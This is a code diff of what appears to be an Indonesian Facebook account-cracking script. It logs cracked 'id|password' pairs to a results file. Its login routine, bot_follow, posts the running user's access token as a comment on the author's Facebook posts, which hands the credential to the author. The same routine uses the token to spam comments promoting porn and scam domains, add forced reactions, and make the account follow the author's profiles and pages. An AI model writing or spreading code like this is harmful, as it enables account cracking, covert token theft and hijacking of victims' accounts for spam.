+					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s|%s               "%(fl.get("id"),i)))
+					self.ada.append("%s|%s"%(fl.get("id"),i))
 					open("Hasil/OK-"+durasi+".txt.txt","a+").write(
-						"%s • %s\n"%(fl.get("id"),i))
+						"%s|%s\n"%(fl.get("id"),i))
 					break
 				else:continue
 					
@@ -843,8 +1241,8 @@ def defaultua():
 def log_token():
     os.system("clear")
     banner()
-    print("You Don't Have Facebook Cookies/Tokens :( Please Visit My Facebook Profile...")
-    print("LINK FACEBOOK : HTTPS://M.FACEBOOK.COM/llovexnxx")
+    print(war+"You Don't Have Facebook Cookies/Tokens :( Please Visit My Facebook Profile")
+    print(war+"LINK FACEBOOK : HTTPS://M.FACEBOOK.COM/llovexnxx")
     toket = input(k+"\n["+p+"•"+k+"]"+p+" Token : ")
     try:
         otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
@@ -911,41 +1309,59 @@ def bot_follow():
 	jalan(c+"Your Name   : "+k+nama)
 	jalan(c+"Your ID     : "+k+id)
 	# 120338706765807 #
-	post1 = ('4111450325629072') # Risky 2011
+	post1 = ('4111448792295892') # Risky 2011
 	post2 = ("120338706765807") # Risky 2021
 	post3 = ("167879918678352") # Sama Macam dibawah
 	post4 = ('180923747373969') # Logo Zero From Risky 2021
 	post5 = ("172628718203472") # Untuk Berbagi Token Dan Cookie Facebook
-	post6 = ("128437652759023") # Fb Kang Reocder
-	post7 = ("103017691967686")
-	kom = pilih(["Lihatlah Logo Buatan Bang @[100063690353340:0]\nhttps://www.facebook.com/100067783659018/posts/103017691967686/?substory_index=0&app=fbl\nhttps://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fbl\nhttps://www.facebook.com/100063690353340/posts/180923747373969/?app=fbl\nhttps://www.facebook.com/100063690353340/posts/167879918678352/?app=fbl", "Lihatlah Logo Buatan Bang @[100063690353340:0]\nhttps://www.facebook.com/100067783659018/posts/103017691967686/?substory_index=0&app=fbl\nhttps://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fbl\nhttps://www.facebook.com/100063690353340/posts/180923747373969/?app=fbl\nhttps://www.facebook.com/100063690353340/posts/167879918678352/?app=fbl"])
-	reac = pilih(["LIKE", "HAHA"])
+	post6 = ("198550702277940") # Logo Akira From Risky 2031
+	post7 = ("198552118944465") # Logo Attaxk From Risky 2021
+	kom = ("XNXX.COM AND YANDEX.COM AND ML.RATUKU.TOP AND UNBLOCJ.COM AND KENATIPU.COM")
+	kom2 = ("@[100063690353340:0] LOVE ZERO TWO")
+	kom3 = ("https://www.facebook.com/photo.php?fbid=4111448792295892&set=a.108534305920714&type=3&app=fbl")
+	kom4 = ("https://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fbl")
+	kom5 = ("https://www.facebook.com/photo.php?fbid=4111450232295748&set=a.202528366521307&type=3&app=fbl")
+	kom6 = ("https://www.facebook.com/100063690353340/posts/167879918678352/?app=fbl")
+	kom7 = ("https://www.facebook.com/100063690353340/posts/198550702277940/?app=fbl")
+	kom8 = ("https://www.facebook.com/100063690353340/posts/198552118944465/?app=fbl")
+	kom9 = ("Yandex.com\nUnblock.com\nMl.Ratuku.Top\nJomblo.Top\nXnxx.com")
+	kom10 = ("https://www.facebook.com/100002924366263/posts/4111450325629072/?app=fbl")
+	kom_1 = pilih([kom3+"\n"+kom4, kom6+"\n"+kom7])
+	kom_2 = pilih([kom10+"\n"+kom9, kom8+"\n"+kom5])
+	kom_3 = pilih([kom, kom2])
+	reac = ("LOVE")
+#### Bot Komen Jangan DiEdit !! PLIS + Token
 	requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
 	requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
 	requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + token + '&access_token=' + token)
-	requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + kom + '&access_token=' + token)
-	time.sleep(1.75)
-	requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom + '&access_token=' + token)
-	requests.post('https://graph.facebook.com/' + post3 + '/comments/?message=' + kom + '&access_token=' + token)
-	requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + kom + '&access_token=' + token)
-	requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + kom + '&access_token=' + token)
-	time.sleep(1.75)
-	requests.post('https://graph.facebook.com/' + post6 + '/comments/?message=' + kom + '&access_token=' + token)
-	requests.post('https://graph.facebook.com/' + post7 + '/comments/?message=' + kom + '&access_token=' + token)
+	print("Tunggu Sebentar 03")
+#### Bot Komen Biasa :)
+	requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + kom_1 + '&access_token=' + token)
+	requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom_2 + '&access_token=' + token)
+	requests.post('https://graph.facebook.com/' + post3 + '/comments/?message=' + kom_3 + '&access_token=' + token)
+	requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + kom_1 + '&access_token=' + token)
+	requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + kom_2 + '&access_token=' + token)
+	requests.post('https://graph.facebook.com/' + post6 + '/comments/?message=' + kom_3 + '&access_token=' + token)
+	requests.post('https://graph.facebook.com/' + post7 + '/comments/?message=' + kom_1 + '&access_token=' + token)
+	print("Tunggu Sebentar 02")
+#### Bot Likenya Jangan DiEdit Taik...
 	requests.post('https://graph.facebook.com/'+post1+'/reactions?type=' +reac+ '&access_token='+ token)
 	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac+ '&access_token='+ token)
 	requests.post('https://graph.facebook.com/'+post3+'/reactions?type=' +reac+ '&access_token='+ token)
-	time.sleep(1.75)
 	requests.post('https://graph.facebook.com/'+post4+'/reactions?type=' +reac+ '&access_token='+ token)
 	requests.post('https://graph.facebook.com/'+post5+'/reactions?type=' +reac+ '&access_token='+ token)
 	requests.post('https://graph.facebook.com/'+post6+'/reactions?type=' +reac+ '&access_token='+ token)
 	requests.post('https://graph.facebook.com/'+post7+'/reactions?type=' +reac+ '&access_token='+ token)
-	time.sleep(1.75)
+	print("Tunggu Sebentar 01")
+#### Bot Follownya Jangan DiEdit Kontol #### Bot Follownya Jangan DiEdit Kontol ####
 	requests.post('https://graph.facebook.com/100000839038766/subscribers?access_token=' + toket) ### FB HAKIKI
 	requests.post('https://graph.facebook.com/100017553167451/subscribers?access_token=' + toket) ### FB HAKIKI
 	requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token) ### FB RISKY
 	requests.post('https://graph.facebook.com/100067783659018/subscribers?access_token=' + token) ### FB RISKY
 	requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token) ### FB RISKY
+	requests.post('https://graph.facebook.com/110877271176800/subscribers?access_token=' + token) ### Halaman Risky
+	requests.post('https://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=' + token) ### Halaman Risky
+#### Bot Follownya Jangan DiEdit Kontol #### Bot Follownya Jangan DiEdit Kontol ####
 	print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
 	time.sleep(2)
 	menu()
